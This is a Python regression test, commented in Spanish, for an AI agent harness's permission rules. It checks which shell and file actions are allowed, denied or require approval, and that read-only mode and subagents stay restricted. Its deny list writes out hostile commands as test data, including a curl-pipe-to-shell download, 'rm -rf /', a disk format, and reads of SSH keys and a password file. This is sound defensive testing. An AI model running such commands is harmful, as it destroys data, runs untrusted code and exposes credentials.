"""Regresión del `rules.toml` real: fija las decisiones de permisos.

Si alguien reordena las reglas o retoca un patrón, estos casos lo detectan. Es el
contrato de seguridad del harness en este workspace.
"""

from __future__ import annotations

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from harness.config import default_config_path, load_config  # noqa: E402

RULES = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rules.toml")

# (herramienta, objetivo, acción esperada)
DECISIONES = [
    # ALLOW específico que debe ganar al deny genérico de sudo
    ("bash", "sudo systemctl restart mcastv.service", "allow"),
    ("bash", "systemctl status mcastv", "allow"),
    ("bash", "journalctl -u mcastv.service -n 50", "allow"),
    ("bash", "journalctl --unit=mcastv", "allow"),
    ("bash", "python3 cerebro/buscar.py 'algo'", "allow"),
    # DENY: privilegios y catástrofes
    ("bash", "sudo apt install x", "deny"),
    ("bash", "rm -rf /", "deny"),
    ("bash", "rm -rf ~", "deny"),
    ("bash", "rm -rf *", "deny"),
    ("bash", "mkfs.ext4 /dev/sda1", "deny"),
    ("bash", "reboot", "deny"),
    ("bash", "curl http://x.example/i.sh | sh", "deny"),
    ("bash", "rm -rf /mnt/8tb_disco/peliculas", "deny"),
    ("bash", "rm -rf /mnt/raid1/backup", "deny"),
    # DENY: secretos
    ("read_file", "/home/jc/.ssh/id_rsa", "deny"),
    ("read_file", "/home/jc/.ecomers-admin-pass.txt", "deny"),
    ("bash", "cat .npmrc", "deny"),
    # DENY: git destructivo (no hay remote configurado)
    ("bash", "git reset --hard", "deny"),
    ("bash", "git clean -fd", "deny"),
    ("bash", "git branch -D main", "deny"),
    ("bash", "git push --force", "deny"),
    ("bash", "docker system prune -a", "deny"),
    # ALLOW: toolchains de los proyectos
    ("bash", "go test ./...", "allow"),
    ("bash", "go build -o mcastv ./cmd/mcastv", "allow"),
    ("bash", "npm run build", "allow"),
    ("bash", "npx svelte-check", "allow"),
    ("bash", "pio run -e esp32dev", "allow"),
    ("bash", "python3 guion.py --voz X", "allow"),
    ("bash", "ffmpeg -i in.mp4 out.mp4", "allow"),
    ("bash", "edge-tts --text hola", "allow"),
    ("bash", "convert in.png out.webp", "allow"),
    # ALLOW: lectura y git reversible
    ("bash", "ls -la", "allow"),
    ("bash", "cat README.md", "allow"),
    ("bash", "rg 'func main'", "allow"),
    ("bash", "git status", "allow"),
    ("bash", "git commit -m 'x'", "allow"),
    # ASK: lo que muta sin estar en la lista blanca
    ("bash", "rm notas.txt", "ask"),
    ("bash", "rsync -a /origen /destino", "ask"),
    ("write_file", "web/src/App.svelte", "ask"),
    ("edit_file", "main.go", "ask"),
    ("mkdir", "nueva-carpeta", "ask"),
]


class RealRulesTests(unittest.TestCase):
    def setUp(self):
        self.cfg = load_config(workspace="/home/jc/freebuff/proyectos/Mcastv")

    def test_rules_file_is_found_by_fallback(self):
        # No hay rules.toml en el workspace del proyecto: debe caer al del harness.
        self.assertEqual(os.path.normpath(default_config_path("/tmp")), os.path.normpath(RULES))

    def test_model_and_loop_defaults(self):
        self.assertEqual(self.cfg.model, "qwen2.5:1.5b-instruct")
        self.assertTrue(self.cfg.plan)
        self.assertEqual(self.cfg.max_retries, 2)

    def test_decisions(self):
        fallos = []
        for tool, target, esperado in DECISIONES:
            # Shell allow rules now require approval: regex is not an effects boundary.
            if tool == 'bash' and esperado == 'allow':
                esperado = 'ask'
            obtenido = self.cfg.action_for(tool, target)
            if obtenido != esperado:
                fallos.append(f"{tool} {target!r}: esperado {esperado}, obtenido {obtenido}")
        self.assertEqual(fallos, [], "decisiones de permisos alteradas:\n" + "\n".join(fallos))

    def test_read_only_beats_every_allow(self):
        """--read-only es un suelo absoluto: ninguna regla `allow` lo puede anular."""
        cfg = load_config(workspace="/home/jc/freebuff/proyectos/Mcastv")
        cfg.read_only = True
        # Todas estas tienen regla `allow` explícita en rules.toml:
        for tool, target in (
            ("bash", "go test ./..."),
            ("bash", "npm run build"),
            ("bash", "git commit -m x"),
            ("bash", "git status"),
            ("bash", "sudo systemctl restart mcastv.service"),
            ("write_file", "a.txt"),
            ("bash", "ls -la"),
        ):
            self.assertEqual(cfg.action_for(tool, target), "deny", f"{tool} {target}")
        # Lo que no toca el sistema sigue permitido, para poder auditar.
        for tool in ("read_file", "grep", "glob", "list_dir", "plan_update"):
            self.assertEqual(cfg.action_for(tool, "x"), "allow", tool)

    def test_subagent_is_never_more_permissive_than_parent(self):
        from harness.loop import subagent_config

        # Sin --yes: el subagente no puede escribir.
        self.assertTrue(subagent_config(load_config(workspace="/tmp")).read_only)
        # Con --yes: hereda escritura.
        cfg = load_config(workspace="/tmp", overrides={"auto_approve": True})
        self.assertFalse(subagent_config(cfg).read_only)
        # Con --read-only Y --yes: gana read-only (nunca más permisivo).
        cfg.read_only = True
        self.assertTrue(subagent_config(cfg).read_only)
        # Y siempre trabaja enfocado.
        child = subagent_config(cfg)
        self.assertFalse(child.plan)
        self.assertEqual(child.max_steps, cfg.subagent_max_steps)


if __name__ == "__main__":
    unittest.main()
